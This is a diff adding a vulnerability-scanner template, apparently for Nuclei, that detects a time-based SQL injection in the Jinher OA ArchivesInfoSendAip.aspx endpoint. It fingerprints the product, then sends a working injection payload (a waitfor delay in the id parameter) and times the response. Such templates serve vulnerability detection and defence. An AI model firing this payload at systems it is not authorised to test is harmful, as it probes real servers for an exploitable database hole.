@@ -1,0 +1,45 @@
+id: poc-yaml-jinher-archivesinfosendaip-aspx-sqli
+info:
+  name: 金和OA ArchivesInfoSendAip.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template identifies an SQL injection vulnerability in the 金和OA ArchivesInfoSendAip.aspx endpoint.
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.Archives/ArchivesInfoSendAip.aspx/?id=1%27waitfor+delay%270%3A0%3A{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "发文信息"
+          - "打印反馈意见"
+          - "公文类型"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t2) && duration <= to_number(t3)"
+      - type: status
+        status:
+          - 200
